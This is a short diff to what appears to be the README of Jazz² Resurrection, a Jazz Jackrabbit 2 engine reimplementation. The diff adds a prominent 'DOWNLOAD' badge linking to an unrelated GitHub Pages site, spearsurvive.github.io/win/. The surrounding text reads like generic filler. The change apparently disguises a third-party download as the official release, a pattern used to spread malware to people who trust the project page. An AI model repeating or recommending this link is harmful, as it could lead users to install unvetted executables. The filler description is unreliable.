@@ -30,6 +30,12 @@ Jazz² Resurrection is a faithful reimplementation of the Jazz Jackrabbit 2 engi
 
 Whether you're a newcomer or a veteran, Jazz² Resurrection provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Jazz² Resurrection](https://img.shields.io/badge/⬇_DOWNLOAD_Jazz²+Resurrection-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
